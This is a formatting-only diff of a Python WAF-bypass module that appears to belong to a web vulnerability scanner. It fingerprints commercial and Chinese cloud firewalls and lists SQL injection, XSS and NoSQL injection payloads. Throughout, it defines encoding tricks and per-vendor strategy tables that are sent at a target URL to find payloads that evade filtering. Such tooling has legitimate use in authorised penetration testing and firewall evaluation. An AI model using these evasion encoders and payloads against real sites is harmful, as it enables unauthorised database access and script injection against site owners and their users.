@@ -16,14 +16,32 @@ logger = get_logger("waf_bypass")
 # ---------------------------------------------------------------------------
 
 WAF_EVIDENCE = {
-    "cloudflare": [r"cloudflare", r"cf-ray", r"__cfduid", r"cloudflare-nginx",
-                   r"Attention Required!.*Cloudflare", r"cf-error-page",
-                   r"Server: cloudflare"],
+    "cloudflare": [
+        r"cloudflare",
+        r"cf-ray",
+        r"__cfduid",
+        r"cloudflare-nginx",
+        r"Attention Required!.*Cloudflare",
+        r"cf-error-page",
+        r"Server: cloudflare",
+    ],
     "akamai": [r"akamai", r"akamaighost", r"reference.*akamai", r"AkamaiGHost"],
-    "mod_security": [r"mod_security", r"Mod Security", r"NOYB", r"403.*ModSecurity",
-                     r"Mod_Security", r"Web Application Firewall"],
-    "aws_waf": [r"awswaf", r"AWSWAF", r"Request blocked.*AWS", r"waf.*allowed",
-                r"AWSALBCORS", r"AWSCLB"],
+    "mod_security": [
+        r"mod_security",
+        r"Mod Security",
+        r"NOYB",
+        r"403.*ModSecurity",
+        r"Mod_Security",
+        r"Web Application Firewall",
+    ],
+    "aws_waf": [
+        r"awswaf",
+        r"AWSWAF",
+        r"Request blocked.*AWS",
+        r"waf.*allowed",
+        r"AWSALBCORS",
+        r"AWSCLB",
+    ],
     "imperva": [r"incapsula", r"Imperva", r"_Incapsula_Resource", r"X-Iinfo"],
     "f5_bigip": [r"BigIP", r"F5", r"TS[a-z0-9]{6,}=", r"Big-IP"],
     "sucuri": [r"sucuri", r"Sucuri", r"Sucuri/Cloudproxy", r"x-sucuri"],
@@ -35,17 +53,26 @@ WAF_EVIDENCE = {
     "comodo": [r"comodo", r"Comodo firewall", r"COMODO"],
     "dotdefender": [r"dotdefender", r"dotDefender", r"DotDefender"],
     # Chinese cloud WAFs
-    "aliyun_waf": [r"aliyundms", r"Yundun", r"waf.aliyun", r"aliyun.*waf",
-                   r"x-sig-auth", r"x-ca-request-id",
-                   r"ALI_CLOUD_WAF", r"Alibaba Cloud WAF"],
-    "baidu_yunjiasu": [r"yunjiasu", r"Yunjiasu", r"baidu.+waf",
-                       r"x-bd-upstream", r"x-bd-traceid"],
-    "tencent_waf": [r"tencent.*waf", r"txwaf", r"waf\.tencent",
-                    r"Tencent Cloud WAF", r"X-WAF-Status"],
-    "360_wangzhan": [r"360wzb", r"wangzhan\.360", r"360.*waf",
-                     r"360WebShield", r"x-whost"],
-    "chaitin_waf": [r"chaitin", r"SafeLine", r"x-request-id",
-                    r"Chaitin WAF", r"SafeLine WAF"],
+    "aliyun_waf": [
+        r"aliyundms",
+        r"Yundun",
+        r"waf.aliyun",
+        r"aliyun.*waf",
+        r"x-sig-auth",
+        r"x-ca-request-id",
+        r"ALI_CLOUD_WAF",
+        r"Alibaba Cloud WAF",
+    ],
+    "baidu_yunjiasu": [r"yunjiasu", r"Yunjiasu", r"baidu.+waf", r"x-bd-upstream", r"x-bd-traceid"],
+    "tencent_waf": [
+        r"tencent.*waf",
+        r"txwaf",
+        r"waf\.tencent",
+        r"Tencent Cloud WAF",
+        r"X-WAF-Status",
+    ],
+    "360_wangzhan": [r"360wzb", r"wangzhan\.360", r"360.*waf", r"360WebShield", r"x-whost"],
+    "chaitin_waf": [r"chaitin", r"SafeLine", r"x-request-id", r"Chaitin WAF", r"SafeLine WAF"],
     "webknight": [r"webknight", r"WebKnight", r"WebKnight Application Firewall"],
     "naxsi": [r"naxsi", r"NAXSI", r"Naxsi"],
     "appwall": [r"appwall", r"AppWall", r"AppWall WAF"],
@@ -125,7 +152,7 @@ BYPASS_PAYLOADS = {
         "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg oNloAd=alert(1)><!-->",
         "<img src=1 onerror=alert(1) onload=alert(1)>",
         "<img %00 src=x onerror=alert(1)>",
-        "<img src=\"  onerror=alert(1)\">",
+        '<img src="  onerror=alert(1)">',
         "<img src=x%09onerror=alert(1)>",
         "<img src=x%0Aonerror=alert(1)>",
         "<img src=x%0Donerror=alert(1)>",
@@ -178,7 +205,7 @@ BYPASS_PAYLOADS = {
         '{"$where": "1==1"}',
         "admin' || '1'=='1",
         "admin' || 1==1//",
-        'username[$ne]=admin&password[$ne]=admin',
+        "username[$ne]=admin&password[$ne]=admin",
     ],
 }
 
@@ -194,8 +221,14 @@ BYPASS_PAYLOADS = {
 WAF_BLOCK_SIGNATURES = {
     "cloudflare": {
         "headers": ["cf-ray", "cf-mitigated"],
-        "text": ["attention required", "cloudflare", "sorry, you have been blocked",
-                 "cf-chl", "just a moment", "enable javascript and cookies"],
+        "text": [
+            "attention required",
+            "cloudflare",
+            "sorry, you have been blocked",
+            "cf-chl",
+            "just a moment",
+            "enable javascript and cookies",
+        ],
     },
     "akamai": {
         "headers": ["akamai-x-ref", "akamai-ghost"],
@@ -211,8 +244,12 @@ WAF_BLOCK_SIGNATURES = {
     },
     "imperva": {
         "headers": ["x-iinfo", "x-cdn"],
-        "text": ["incapsula", "imperva", "contact support for additional information",
-                 "blocked by firewall"],
+        "text": [
+            "incapsula",
+            "imperva",
+            "contact support for additional information",
+            "blocked by firewall",
+        ],
     },
     "safedog": {
         "text": ["safedog", "安全狗", "请求被拦截", "site cannot be reached"],
@@ -227,13 +264,27 @@ WAF_BLOCK_SIGNATURES = {
         "text": ["baidu yunjiasu", "百度云加速", "yunjiasu"],
     },
     "baota": {
-        "text": ["btwaf", "宝塔", "您的请求已被拦截", "被防火墙拦截",
-                 "安全防火墙", "bt.cn/bbs", "www.bt.cn", "拦截详情"],
+        "text": [
+            "btwaf",
+            "宝塔",
+            "您的请求已被拦截",
+            "被防火墙拦截",
+            "安全防火墙",
+            "bt.cn/bbs",
+            "www.bt.cn",
+            "拦截详情",
+        ],
     },
     "generic": {
-        "text": ["waf", "web application firewall", "blocked by security",
-                 "access denied", "request rejected", "your ip has been blocked",
-                 "403 forbidden"],
+        "text": [
+            "waf",
+            "web application firewall",
+            "blocked by security",
+            "access denied",
+            "request rejected",
+            "your ip has been blocked",
+            "403 forbidden",
+        ],
     },
 }
 
@@ -266,8 +317,10 @@ def is_blocked(resp, threshold: int = 0) -> bool:
         return True
     return bool(classify_block(resp))
 
-def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
-                    timeout: float = 10.0) -> Dict:
+
+def fingerprint_waf(
+    url: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> Dict:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -291,13 +344,17 @@ def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
                             prefix = h_pattern.rstrip("*")
                             if lower_k.startswith(prefix):
                                 result["detected"] = True
-                                result["all_matches"].append({"waf": waf_name, "header": k, "source": source_label})
+                                result["all_matches"].append(
+                                    {"waf": waf_name, "header": k, "source": source_label}
+                                )
                                 if not result["name"]:
                                     result["name"] = waf_name
                                     result["evidence"].append("header: %s" % k)
                         elif lower_k == h_pattern:
                             result["detected"] = True
-                            result["all_matches"].append({"waf": waf_name, "header": k, "source": source_label})
+                            result["all_matches"].append(
+                                {"waf": waf_name, "header": k, "source": source_label}
+                            )
                             if not result["name"]:
                                 result["name"] = waf_name
                                 result["evidence"].append("header: %s" % k)
@@ -306,7 +363,9 @@ def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
                 for pat in patterns:
                     if re.search(pat, r.text, re.IGNORECASE):
                         result["detected"] = True
-                        result["all_matches"].append({"waf": waf_name, "pattern": pat, "source": source_label})
+                        result["all_matches"].append(
+                            {"waf": waf_name, "pattern": pat, "source": source_label}
+                        )
                         if not result["name"]:
                             result["name"] = waf_name
                             result["evidence"].append(pat)
@@ -314,7 +373,9 @@ def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
 
             if source_label != "passive" and r.status_code in (403, 406, 429, 503):
                 if not result["name"]:
-                    result["all_matches"].append({"status_block": r.status_code, "source": source_label})
+                    result["all_matches"].append(
+                        {"status_block": r.status_code, "source": source_label}
+                    )
 
         except Exception as e:
             logger.debug("waf fingerprint probe %s: %s", source_label, e)
@@ -330,8 +391,10 @@ def generate_bypasses(vuln_type: str) -> List[str]:
 # Basic WAF check: fingerprint + bypass payload spraying
 # ---------------------------------------------------------------------------
 
-def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0) -> Dict:
+
+def check(
+    url: str, param: str = None, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> Dict:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -347,20 +410,27 @@ def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
             tested = []
             for payload in payloads:
                 try:
-                    r = sess.get(build_url(url, param, payload),
-                                 timeout=timeout)
-                    tested.append({"payload": payload[:25], "status": r.status_code,
-                                   "length": len(r.text)})
+                    r = sess.get(build_url(url, param, payload), timeout=timeout)
+                    tested.append(
+                        {"payload": payload[:25], "status": r.status_code, "length": len(r.text)}
+                    )
                 except Exception as e:
                     logger.debug("waf bypass %s: %s", payload[:15], e)
 
             for payload in payloads[:5]:
                 try:
-                    r = sess.get(build_url(url, param, payload),
-                                 headers={"X-Forwarded-For": "127.0.0.1"},
-                                 timeout=timeout)
-                    tested.append({"payload": "hdr:%s" % payload[:20], "status": r.status_code,
-                                   "length": len(r.text)})
+                    r = sess.get(
+                        build_url(url, param, payload),
+                        headers={"X-Forwarded-For": "127.0.0.1"},
+                        timeout=timeout,
+                    )
+                    tested.append(
+                        {
+                            "payload": "hdr:%s" % payload[:20],
+                            "status": r.status_code,
+                            "length": len(r.text),
+                        }
+                    )
                 except Exception as e:
                     logger.debug("waf bypass hdr %s: %s", payload[:15], e)
 
@@ -373,6 +443,7 @@ def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
 # ===========================================================================
 # Heavy Bypass Engine (formerly waf_heavy_bypass)
 # ===========================================================================
+
 
 class BypassEncoder:
     @staticmethod
@@ -396,9 +467,12 @@ class BypassEncoder:
     @staticmethod
     def overlong_utf8_encode(s: str) -> str:
         mapping = {
-            "<": "%C0%BC", ">": "%C0%BE",
-            "'": "%C0%A7", '"': "%C0%A2",
-            "=": "%C0%BC", ";": "%C0%BB",
+            "<": "%C0%BC",
+            ">": "%C0%BE",
+            "'": "%C0%A7",
+            '"': "%C0%A2",
+            "=": "%C0%BC",
+            ";": "%C0%BB",
         }
         result = ""
         for c in s:
@@ -408,8 +482,10 @@ class BypassEncoder:
     @staticmethod
     def ibm037_encode(s: str) -> str:
         mapping = {
-            "'": "%X7F", '"': "%X7F",
-            "=": "%X7E", ";": "%X5E",
+            "'": "%X7F",
+            '"': "%X7F",
+            "=": "%X7E",
+            ";": "%X5E",
             " ": "%X40",
         }
         result = ""
@@ -427,14 +503,62 @@ class BypassEncoder:
 
     @staticmethod
     def case_random(s: str) -> str:
-        sql_kw = {"or", "and", "select", "union", "from", "where", "order", "by",
-                  "sleep", "waitfor", "delay", "insert", "update", "delete", "drop",
-                  "create", "alter", "exec", "having", "group", "null", "not",
-                  "into", "values", "set", "like", "admin", "all", "distinct",
-                  "pg_sleep", "if", "substring", "user", "database", "table",
-                  "column", "schema", "benchmark", "load_file", "intooutfile",
-                  "information_schema", "and", "or", "on", "as", "convert", "cast",
-                  "declare", "char", "varchar", "from", "dual", "where", "having"}
+        sql_kw = {
+            "or",
+            "and",
+            "select",
+            "union",
+            "from",
+            "where",
+            "order",
+            "by",
+            "sleep",
+            "waitfor",
+            "delay",
+            "insert",
+            "update",
+            "delete",
+            "drop",
+            "create",
+            "alter",
+            "exec",
+            "having",
+            "group",
+            "null",
+            "not",
+            "into",
+            "values",
+            "set",
+            "like",
+            "admin",
+            "all",
+            "distinct",
+            "pg_sleep",
+            "if",
+            "substring",
+            "user",
+            "database",
+            "table",
+            "column",
+            "schema",
+            "benchmark",
+            "load_file",
+            "intooutfile",
+            "information_schema",
+            "and",
+            "or",
+            "on",
+            "as",
+            "convert",
+            "cast",
+            "declare",
+            "char",
+            "varchar",
+            "from",
+            "dual",
+            "where",
+            "having",
+        }
         result = []
         for word in s.split(" "):
             stripped = word.strip("'\"();\n\t")
@@ -514,9 +638,26 @@ class BypassEncoder:
     def versioned_comment(s: str) -> str:
         """MySQL versioned comments /*!50000SELECT*/ - executed by MySQL,
         skipped by most WAF signature matchers."""
-        for kw in ("UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "SLEEP",
-                   "ORDER", "BY", "HAVING", "GROUP", "NULL", "INSERT",
-                   "UPDATE", "DELETE", "INTO", "VALUES", "BENCHMARK"):
+        for kw in (
+            "UNION",
+            "SELECT",
+            "FROM",
+            "WHERE",
+            "OR",
+            "AND",
+            "SLEEP",
+            "ORDER",
+            "BY",
+            "HAVING",
+            "GROUP",
+            "NULL",
+            "INSERT",
+            "UPDATE",
+            "DELETE",
+            "INTO",
+            "VALUES",
+            "BENCHMARK",
+        ):
             s = re.sub(r"\b%s\b" % kw, "/*!50000%s*/" % kw, s)
         return s
 
@@ -605,7 +746,7 @@ class HTTPBypass:
     def chunked_encoding(body: str) -> Dict[str, str]:
         chunks = []
         for i in range(0, len(body), 2):
-            chunk = body[i:i + 2]
+            chunk = body[i : i + 2]
             chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
         chunks.append("0\r\n\r\n")
         return {"Transfer-Encoding": "chunked", "Content-Type": "application/x-www-form-urlencoded"}
@@ -624,13 +765,20 @@ class HTTPBypass:
 # ---------------------------------------------------------------------------
 
 BLOCK_PATTERNS = [
-    r"(?i)blocked", r"(?i)denied", r"(?i)rejected",
-    r"(?i)security", r"(?i)firewall", r"(?i)waf",
-    r"(?i)please.*wait", r"(?i)challenge",
-    r"(?i)access.*forbidden", r"(?i)forbidden.*access",
+    r"(?i)blocked",
+    r"(?i)denied",
+    r"(?i)rejected",
+    r"(?i)security",
+    r"(?i)firewall",
+    r"(?i)waf",
+    r"(?i)please.*wait",
+    r"(?i)challenge",
+    r"(?i)access.*forbidden",
+    r"(?i)forbidden.*access",
     r"(?i)your.*request.*has.*been.*blocked",
     r"(?i)contact.*administrator",
-    r"cf-error-page", r"cf-ray",
+    r"cf-error-page",
+    r"cf-ray",
     r"Reference.*#\d+\.\w+",
 ]
 
@@ -645,8 +793,9 @@ def _detect_block(resp: requests.Response) -> bool:
     return False
 
 
-def adaptive_bypass(url: str, param: str, payload: str,
-                    sess: requests.Session, timeout: float = 10.0) -> Dict:
+def adaptive_bypass(
+    url: str, param: str, payload: str, sess: requests.Session, timeout: float = 10.0
+) -> Dict:
     baseline = None
     try:
         r = sess.get(build_url(url, param, "NOMINAL_TEST"), timeout=timeout)
@@ -685,11 +834,21 @@ def adaptive_bypass(url: str, param: str, payload: str,
             if _detect_block(r):
                 continue
             if baseline and abs(len(r.text) - len(baseline.text)) > 50:
-                return {"success": True, "strategy_index": i, "payload": encoded[:60],
-                        "status": r.status_code, "length": len(r.text)}
+                return {
+                    "success": True,
+                    "strategy_index": i,
+                    "payload": encoded[:60],
+                    "status": r.status_code,
+                    "length": len(r.text),
+                }
             if r.status_code in (200, 302) and len(r.text) > 100:
-                return {"success": True, "strategy_index": i, "payload": encoded[:60],
-                        "status": r.status_code, "length": len(r.text)}
+                return {
+                    "success": True,
+                    "strategy_index": i,
+                    "payload": encoded[:60],
+                    "status": r.status_code,
+                    "length": len(r.text),
+                }
         except Exception as e:
             logger.debug("adaptive_bypass %d: %s", i, e)
     return {"success": False, "strategies_tried": len(strategies)}
@@ -697,74 +856,119 @@ def adaptive_bypass(url: str, param: str, payload: str,
 
 WAF_BYPASS_STRATEGIES: Dict[Optional[str], Dict] = {
     "cloudflare": {
-        "priority": ["double_url", "inline_comment", "null_bytes", "hpp",
-                      "tab_injection", "case_random", "newline_injection"],
+        "priority": [
+            "double_url",
+            "inline_comment",
+            "null_bytes",
+            "hpp",
+            "tab_injection",
+            "case_random",
+            "newline_injection",
+        ],
         "chain": [0, 1, 2, 3, 4, 5, 6],
         "skip": [],
         "time_sensitive": True,
     },
     "mod_security": {
-        "priority": ["case_random", "scientific", "nested_comment_mysql",
-                      "overlong_utf8", "hpp_duplicate", "logical_swaps",
-                      "eq_to_like", "null_bytes"],
+        "priority": [
+            "case_random",
+            "scientific",
+            "nested_comment_mysql",
+            "overlong_utf8",
+            "hpp_duplicate",
+            "logical_swaps",
+            "eq_to_like",
+            "null_bytes",
+        ],
         "chain": [0, 4, 6, 7, 8, 11, 12],
         "skip": [],
         "time_sensitive": False,
     },
     "aws_waf": {
-        "priority": ["double_url", "unicode_url", "case_random", "method_override",
-                      "tab_injection", "mixed_case_heavy"],
+        "priority": [
+            "double_url",
+            "unicode_url",
+            "case_random",
+            "method_override",
+            "tab_injection",
+            "mixed_case_heavy",
+        ],
         "chain": [1, 2, 3, 4, 5, 8],
         "skip": [],
         "time_sensitive": True,
     },
     "imperva": {
-        "priority": ["hex_encode", "null_bytes", "chunked", "content_type_xml",
-                      "url_encode"],
+        "priority": ["hex_encode", "null_bytes", "chunked", "content_type_xml", "url_encode"],
         "chain": [0, 4, 5, 11],
         "skip": ["url_encode"],
         "time_sensitive": True,
     },
     "f5_bigip": {
-        "priority": ["ibm037", "overlong_utf8", "inline_comment", "hpp",
-                      "null_bytes", "hex_encode"],
+        "priority": [
+            "ibm037",
+            "overlong_utf8",
+            "inline_comment",
+            "hpp",
+            "null_bytes",
+            "hex_encode",
+        ],
         "chain": [2, 3, 5, 6, 8],
         "skip": [],
         "time_sensitive": False,
     },
     "aliyun_waf": {
-        "priority": ["tab_injection", "newline_injection", "null_bytes",
-                      "double_url", "inline_comment", "case_random"],
+        "priority": [
+            "tab_injection",
+            "newline_injection",
+            "null_bytes",
+            "double_url",
+            "inline_comment",
+            "case_random",
+        ],
         "chain": [0, 1, 2, 3, 4, 5, 9, 11],
         "skip": [],
         "time_sensitive": True,
     },
     "baidu_yunjiasu": {
-        "priority": ["double_url", "hex_encode", "null_bytes",
-                      "unicode_url", "inline_comment"],
+        "priority": ["double_url", "hex_encode", "null_bytes", "unicode_url", "inline_comment"],
         "chain": [0, 1, 4, 5, 6, 12],
         "skip": [],
         "time_sensitive": True,
     },
     "chaitin_waf": {
-        "priority": ["case_random", "logical_swaps", "eq_to_like",
-                      "scientific", "inline_comment", "negative_sign"],
+        "priority": [
+            "case_random",
+            "logical_swaps",
+            "eq_to_like",
+            "scientific",
+            "inline_comment",
+            "negative_sign",
+        ],
         "chain": [2, 8, 7, 10, 11, 13],
         "skip": [],
         "time_sensitive": False,
     },
     "360_wangzhan": {
-        "priority": ["inline_comment", "null_bytes", "tab_injection",
-                      "double_url", "hex_encode"],
+        "priority": ["inline_comment", "null_bytes", "tab_injection", "double_url", "hex_encode"],
         "chain": [0, 2, 4, 5, 6, 9],
         "skip": [],
         "time_sensitive": True,
     },
     None: {
-        "priority": ["url_encode", "double_url", "case_random",
-                      "inline_comment", "null_bytes", "hpp",
-                      "scientific", "chunked", "tab_injection",
-                      "newline_injection", "logical_swaps", "eq_to_like"],
+        "priority": [
+            "url_encode",
+            "double_url",
+            "case_random",
+            "inline_comment",
+            "null_bytes",
+            "hpp",
+            "scientific",
+            "chunked",
+            "tab_injection",
+            "newline_injection",
+            "logical_swaps",
+            "eq_to_like",
+        ],
         "chain": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13],
         "skip": [],
         "time_sensitive": False,
@@ -804,9 +1008,17 @@ HTTP_BYPASS_TECHNIQUES: Dict[str, Callable] = {
 }
 
 BASE_SQLI_PAYLOADS = [
-    "'", '"', "')", "'))", "\\'", "`",
-    "' OR '1'='1", "' OR 1=1-- ", "1' OR '1'='1",
-    "' AND 1=1-- ", "' AND 1=2-- ",
+    "'",
+    '"',
+    "')",
+    "'))",
+    "\\'",
+    "`",
+    "' OR '1'='1",
+    "' OR 1=1-- ",
+    "1' OR '1'='1",
+    "' AND 1=1-- ",
+    "' AND 1=2-- ",
     "' UNION SELECT NULL-- ",
     "' UNION SELECT NULL,NULL-- ",
     "' UNION SELECT 1,2,3-- ",
@@ -830,7 +1042,7 @@ XSS_BYPASS_PAYLOADS = [
     "<IMG SRC=x onerror=alert(1)>",
     "<scr<script>ipt>alert(1)</scr</script>ipt>",
     "<script/random=1>alert(1)</script>",
-    "\" autofocus onfocus=alert(1) x=\"",
+    '" autofocus onfocus=alert(1) x="',
     "' autofocus onfocus=alert(1) x='",
     "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg oNloAd=alert(1)><!-->",
     "<script\\x00>alert(1)</script>",
@@ -845,8 +1057,9 @@ XSS_BYPASS_PAYLOADS = [
 ]
 
 
-def generate_sqli_payloads(raw_payload: str, waf_name: Optional[str],
-                           max_payloads: int = 30) -> List[Dict]:
+def generate_sqli_payloads(
+    raw_payload: str, waf_name: Optional[str], max_payloads: int = 30
+) -> List[Dict]:
     strategies = WAF_BYPASS_STRATEGIES.get(waf_name, WAF_BYPASS_STRATEGIES[None])
     results = []
 
@@ -865,11 +1078,13 @@ def generate_sqli_payloads(raw_payload: str, waf_name: Optional[str],
             try:
                 encoded = encoder(raw_payload)
                 if encoded and encoded != raw_payload:
-                    results.append({
-                        "payload": encoded,
-                        "technique": f"sqli_{enc_name}",
-                        "encoder": enc_name,
-                    })
+                    results.append(
+                        {
+                            "payload": encoded,
+                            "technique": f"sqli_{enc_name}",
+                            "encoder": enc_name,
+                        }
+                    )
             except Exception as e:
                 logger.debug("encoder %s failed: %s", enc_name, e)
 
@@ -881,11 +1096,13 @@ def generate_sqli_payloads(raw_payload: str, waf_name: Optional[str],
             try:
                 chained = apply_encoder_chain(raw_payload, chain)
                 if chained and chained != raw_payload:
-                    results.append({
-                        "payload": chained,
-                        "technique": f"sqli_chain_{ci}",
-                        "encoder": "chain_%d" % ci,
-                    })
+                    results.append(
+                        {
+                            "payload": chained,
+                            "technique": f"sqli_chain_{ci}",
+                            "encoder": "chain_%d" % ci,
+                        }
+                    )
             except Exception as e:
                 logger.debug("chain %d failed: %s", ci, e)
 
@@ -922,8 +1139,9 @@ def _indicates_injection(r, baseline) -> bool:
     return False
 
 
-def test_sqli_bypass(url: str, param: str, sess: requests.Session,
-                     waf_name: Optional[str], timeout: float) -> Dict:
+def test_sqli_bypass(
+    url: str, param: str, sess: requests.Session, waf_name: Optional[str], timeout: float
+) -> Dict:
     result: Dict[str, Any] = {"vulnerable": False, "bypasses": [], "best_payload": None}
 
     baseline = None
@@ -938,8 +1156,7 @@ def test_sqli_bypass(url: str, param: str, sess: requests.Session,
             payload = var["payload"]
             technique = var["technique"]
             try:
-                r = sess.get(build_url(url, param, payload),
-                             timeout=timeout + 2)
+                r = sess.get(build_url(url, param, payload), timeout=timeout + 2)
             except Exception:
                 continue
 
@@ -961,22 +1178,22 @@ def test_sqli_bypass(url: str, param: str, sess: requests.Session,
     return result
 
 
-def test_xss_bypass(url: str, param: str, sess: requests.Session,
-                    timeout: float) -> Dict:
+def test_xss_bypass(url: str, param: str, sess: requests.Session, timeout: float) -> Dict:
     result: Dict[str, Any] = {"vulnerable": False, "bypasses": []}
 
     for payload in XSS_BYPASS_PAYLOADS:
         try:
             marker = f"XSS_{random.randint(10000, 99999)}"
             test_payload = marker + payload
-            r = sess.get(build_url(url, param, test_payload),
-                         timeout=timeout)
+            r = sess.get(build_url(url, param, test_payload), timeout=timeout)
             if marker in r.text:
                 result["vulnerable"] = True
-                result["bypasses"].append({
-                    "payload": payload[:60],
-                    "status": r.status_code,
-                })
+                result["bypasses"].append(
+                    {
+                        "payload": payload[:60],
+                        "status": r.status_code,
+                    }
+                )
                 if len(result["bypasses"]) >= 3:
                     return result
         except Exception:
@@ -985,8 +1202,9 @@ def test_xss_bypass(url: str, param: str, sess: requests.Session,
     return result
 
 
-def test_http_bypass(url: str, param: str, sess: requests.Session,
-                     waf_name: Optional[str], timeout: float) -> Dict:
+def test_http_bypass(
+    url: str, param: str, sess: requests.Session, waf_name: Optional[str], timeout: float
+) -> Dict:
     result: Dict[str, Any] = {"vulnerable": False, "bypasses": []}
 
     test_payload = "' OR '1'='1"
@@ -1002,35 +1220,45 @@ def test_http_bypass(url: str, param: str, sess: requests.Session,
                         query_params[k] = v
 
             hpp_query = HTTPBypass.hpp(query_params, param, test_payload)
-            target = url.split("?")[0] + "?" + hpp_query if query_params else url + "?" + f"{param}={test_payload}"
+            target = (
+                url.split("?")[0] + "?" + hpp_query
+                if query_params
+                else url + "?" + f"{param}={test_payload}"
+            )
             r = sess.get(target, timeout=timeout)
             if _indicates_injection(r, None):
                 result["vulnerable"] = True
-                result["bypasses"].append({
-                    "technique": "hpp",
-                    "payload": test_payload,
-                    "status": r.status_code,
-                })
+                result["bypasses"].append(
+                    {
+                        "technique": "hpp",
+                        "payload": test_payload,
+                        "status": r.status_code,
+                    }
+                )
         except Exception as e:
             logger.debug("hpp test: %s", e)
 
-    if not result["vulnerable"] and "chunked" in WAF_BYPASS_STRATEGIES.get(waf_name, {}).get("priority", []):
+    if not result["vulnerable"] and "chunked" in WAF_BYPASS_STRATEGIES.get(waf_name, {}).get(
+        "priority", []
+    ):
         try:
             chunk_headers = HTTPBypass.chunked_encoding(f"{param}={test_payload}")
             body = ""
             for i in range(0, len(f"{param}={test_payload}"), 2):
                 chunked_payload = f"{param}={test_payload}"
-                chunk = chunked_payload[i:i + 2]
+                chunk = chunked_payload[i : i + 2]
                 body += f"{len(chunk):x}\r\n{chunk}\r\n"
             body += "0\r\n\r\n"
             r = sess.post(url, data=body, headers=chunk_headers, timeout=timeout)
             if _indicates_injection(r, None):
                 result["vulnerable"] = True
-                result["bypasses"].append({
-                    "technique": "chunked",
-                    "payload": test_payload,
-                    "status": r.status_code,
-                })
+                result["bypasses"].append(
+                    {
+                        "technique": "chunked",
+                        "payload": test_payload,
+                        "status": r.status_code,
+                    }
+                )
         except Exception as e:
             logger.debug("chunked test: %s", e)
 
@@ -1038,15 +1266,18 @@ def test_http_bypass(url: str, param: str, sess: requests.Session,
         for method in ["GET", "POST", "PUT", "PATCH"]:
             try:
                 override_headers = HTTPBypass.method_override(method)
-                r = sess.get(build_url(url, param, test_payload),
-                             headers=override_headers, timeout=timeout)
+                r = sess.get(
+                    build_url(url, param, test_payload), headers=override_headers, timeout=timeout
+                )
                 if _indicates_injection(r, None):
                     result["vulnerable"] = True
-                    result["bypasses"].append({
-                        "technique": f"method_override_{method}",
-                        "payload": test_payload,
-                        "status": r.status_code,
-                    })
+                    result["bypasses"].append(
+                        {
+                            "technique": f"method_override_{method}",
+                            "payload": test_payload,
+                            "status": r.status_code,
+                        }
+                    )
                     break
             except Exception:
                 pass
@@ -1054,8 +1285,7 @@ def test_http_bypass(url: str, param: str, sess: requests.Session,
     return result
 
 
-def test_waf_strength(url: str, sess: requests.Session,
-                      timeout: float) -> Dict:
+def test_waf_strength(url: str, sess: requests.Session, timeout: float) -> Dict:
     result = {
         "waf": None,
         "blocked_count": 0,
@@ -1087,13 +1317,16 @@ def test_waf_strength(url: str, sess: requests.Session,
 
     result["blocked_count"] = blocked
     result["bypass_count"] = passed
-    result["summary"]["block_rate"] = f"{blocked}/{blocked + passed}" if (blocked + passed) > 0 else "0/0"
+    result["summary"]["block_rate"] = (
+        f"{blocked}/{blocked + passed}" if (blocked + passed) > 0 else "0/0"
+    )
 
     return result
 
 
-def heavy_check(url: str, param: str = None, sess: Optional[requests.Session] = None,
-                timeout: float = 10.0) -> Dict:
+def heavy_check(
+    url: str, param: str = None, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> Dict:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -1115,27 +1348,20 @@ def heavy_check(url: str, param: str = None, sess: Optional[requests.Session] = 
         result["sqli_bypass"] = sqli_r
         if sqli_r["vulnerable"]:
             result["vulnerable"] = True
-            result["findings"].extend([
-                {"type": "sqli_waf_bypass", **b}
-                for b in sqli_r["bypasses"]
-            ])
+            result["findings"].extend(
+                [{"type": "sqli_waf_bypass", **b} for b in sqli_r["bypasses"]]
+            )
 
         xss_r = test_xss_bypass(url, param, sess, timeout)
         result["xss_bypass"] = xss_r
         if xss_r["vulnerable"]:
             result["vulnerable"] = True
-            result["findings"].extend([
-                {"type": "xss_waf_bypass", **b}
-                for b in xss_r["bypasses"]
-            ])
+            result["findings"].extend([{"type": "xss_waf_bypass", **b} for b in xss_r["bypasses"]])
 
     http_r = test_http_bypass(url, param or "id", sess, waf_name, timeout)
     result["http_bypass"] = http_r
     if http_r["vulnerable"]:
         result["vulnerable"] = True
-        result["findings"].extend([
-            {"type": "http_waf_bypass", **b}
-            for b in http_r["bypasses"]
-        ])
+        result["findings"].extend([{"type": "http_waf_bypass", **b} for b in http_r["bypasses"]])
 
     return result
